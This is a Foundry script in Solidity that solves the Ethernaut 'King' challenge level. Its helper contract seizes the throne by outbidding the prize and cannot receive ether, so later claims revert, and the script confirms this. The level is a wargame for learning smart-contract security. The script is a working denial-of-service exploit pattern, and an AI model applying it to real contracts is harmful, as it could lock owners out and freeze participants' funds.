// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {King} from "./Problem.sol";

contract Solution {
    function breakIt(address king) external payable {
        (bool sent, bytes memory data) = payable(address(king)).call{value: msg.value}("");
        require(sent, "Unsuccessful");
    }
}

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();
        King king = King(_instanceAddress);
        Solution solution = new Solution();
        uint256 value = king.prize() + 1;
        solution.breakIt{value: value}(_instanceAddress);
        vm.stopBroadcast();

        vm.startPrank(king.owner());
        vm.expectRevert();
        payable(address(solution)).call{value: value + 1}("");
        vm.stopPrank();
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("9");
    }

    function getCreationValue() internal view override returns (uint256) {
        return 0.001 ether;
    }
}
